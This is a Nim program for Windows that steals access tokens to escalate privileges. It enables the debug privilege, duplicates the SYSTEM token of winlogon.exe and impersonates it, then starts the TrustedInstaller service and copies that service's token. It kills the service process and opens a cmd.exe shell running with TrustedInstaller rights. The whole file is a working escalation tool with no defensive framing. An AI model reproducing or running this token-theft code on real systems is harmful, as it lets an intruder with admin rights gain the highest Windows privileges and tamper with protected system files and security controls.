import winim

proc getErrorString(): string =
    var err = GetLastError()
    if err == -1:
        return ""

    var msgBuf: WideCString = nil
    discard FormatMessage(
        FORMAT_MESSAGE_FROM_SYSTEM or FORMAT_MESSAGE_ALLOCATE_BUFFER or FORMAT_MESSAGE_IGNORE_INSERTS,
        nil, err, cast[DWORD](MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT)), cast[LPWSTR](addr msgBuf), 0, nil
    )
    let errorMessage = $msgBuf
    LocalFree(cast[HLOCAL](msgBuf))

    return errorMessage

proc toString(arr: openArray[WCHAR]): string =
    for wc in arr:
        if cast[char](wc) == '\0':
            break
        result.add(cast[char](wc))

proc SetPrivilege(hToken: HANDLE, lpszPrivilege: string, bEnablePrivilege: WINBOOL): DWORD =
    var luid: LUID
    if LookupPrivilegeValueW(NULL, lpszPrivilege, &luid):
        var tp: TOKEN_PRIVILEGES
        zeroMem(&tp, sizeof(TOKEN_PRIVILEGES))
        tp.PrivilegeCount = 1
        tp.Privileges[0].Luid = luid
        tp.Privileges[0].Attributes = if bEnablePrivilege: SE_PRIVILEGE_ENABLED else: 0
        AdjustTokenPrivileges(hToken, FALSE, &tp, 0, cast[PTOKEN_PRIVILEGES](NULL), cast[PDWORD](NULL))
    return GetLastError()

proc GetDebugPrivilege(): bool =
    var hProcess = GetCurrentProcess()
    var hToken: HANDLE
    if OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES, &hToken):
        var errCode = SetPrivilege(hToken, SE_DEBUG_NAME, TRUE)
        return errCode == 0
    return false

proc GetPidByName(procName: string): DWORD =
    var hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    defer: CloseHandle(hSnap)

    var procEntry: PROCESSENTRY32
    procEntry.dwSize = DWORD(sizeof(PROCESSENTRY32))
    if Process32First(hSnap, addr procEntry):
        while Process32Next(hSnap, addr procEntry):
            if procEntry.szExeFile.toString() == procName:
                result = procEntry.th32ProcessID
                break

proc TerminateProcess(pid: DWORD): void =
    if pid == 0:
        return
    var hProc: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid)
    if hProc == INVALID_HANDLE_VALUE:
        raise newException(Exception, "Invalid process handle: " & getErrorString())
    defer: CloseHandle(hProc)

    if TerminateProcess(hProc, 1) == 0:
        raise newException(Exception, "Couldn't terminate process: " & getErrorString())

proc GetProcessToken(pid: DWORD): HANDLE =
    var hCurrentProcess: HANDLE
    var hToken: HANDLE
    if pid == 0:
        hCurrentProcess = GetCurrentProcess()
    else:
        hCurrentProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, pid)
        if hCurrentProcess == ERROR_INVALID_HANDLE:
            raise newException(Exception, "Couldn't open process: " & getErrorString())

    if OpenProcessToken(hCurrentProcess, TOKEN_ASSIGN_PRIMARY or TOKEN_DUPLICATE or TOKEN_IMPERSONATE or TOKEN_QUERY, &hToken) == 0:
        CloseHandle(hCurrentProcess)
        raise newException(Exception, "Couldn't open process token: " & getErrorString())

    CloseHandle(hCurrentProcess)
    return hToken


proc DuplicateProcessToken(pid: DWORD, tokenType: TOKEN_TYPE): HANDLE =
    var hToken = GetProcessToken(pid)
    if hToken == INVALID_HANDLE_VALUE:
        return INVALID_HANDLE_VALUE
    defer: CloseHandle(hToken)

    var seImpersonationLevel: SECURITY_IMPERSONATION_LEVEL = securityImpersonation
    var hNewToken: HANDLE

    if DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, seImpersonationLevel, tokenType, &hNewToken) == 0:
        raise newException(Exception, "Couldn't duplicate process token: " & getErrorString())
        
    return hNewToken

when isMainModule:
    if not GetDebugPrivilege():
        echo "You need to run this program as an admin"
        quit(1)

    var targetPid = GetPidByName("winlogon.exe")
    
    var hImpToken = DuplicateProcessToken(targetPid, tokenImpersonation)
    if hImpToken == INVALID_HANDLE_VALUE:
        quit(1)
    echo "Duplicated Token!"

    var hThread: HANDLE = GetCurrentThread()
    if SetThreadToken(&hThread, hImpToken) == 0:
        echo "Couldn't set token to current thread: " & getErrorString()
        quit(1)
    echo "Applied token to current thread!"

    CloseHandle(hThread)
    CloseHandle(hImpToken)

    var hService: SC_HANDLE = OpenServiceW(OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS), "trustedinstaller", MAXIMUM_ALLOWED)
    if hService == 0:
        echo "Couldn't open trusted installer service: " & getErrorString()
        quit(1)
    
    var ssp: SERVICE_STATUS_PROCESS
    var bytesNeeded: DWORD
    if QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, cast[ptr BYTE](&ssp), cast[DWORD](sizeof(ssp)), &bytesNeeded) == 0:
        echo "Couldn't query service status: " & getErrorString()
        quit(1)

    if ssp.dwCurrentState == SERVICE_RUNNING:
        echo "Trusted installer already running!"
    else:
        if StartServiceW(hService, 0, NULL) == 0:
            echo "Couldn't start service: " & getErrorString()
            quit(1)

        echo "Started Trusted installer service!"

        if QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, cast[ptr BYTE](&ssp), cast[DWORD](sizeof(ssp)), &bytesNeeded) == 0:
            echo "Couldn't query status: " & getErrorString()
            quit(1)

    CloseServiceHandle(hService)

    var hTrustedInstallerToken: HANDLE = DuplicateProcessToken(ssp.dwProcessId, tokenPrimary)
    if hTrustedInstallerToken == INVALID_HANDLE_VALUE:
        echo "failed to duplicate token: " & getErrorString()
        quit(1)

    echo "duplicated trustedinstaller token!"

    TerminateProcess(ssp.dwProcessId)
    TerminateProcess(GetPidByName("TrustedInstaller.exe"))

    var si: STARTUPINFO
    var pi: PROCESS_INFORMATION
    var success: WINBOOL = CreateProcessWithTokenW(hTrustedInstallerToken, LOGON_NETCREDENTIALS_ONLY, "C:\\Windows\\System32\\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)
    if success == FALSE:
        echo "Failed to create cmd process: " & getErrorString()
        quit(1)

    echo "Created TrustedInstaller cmd"
    CloseHandle(hTrustedInstallerToken)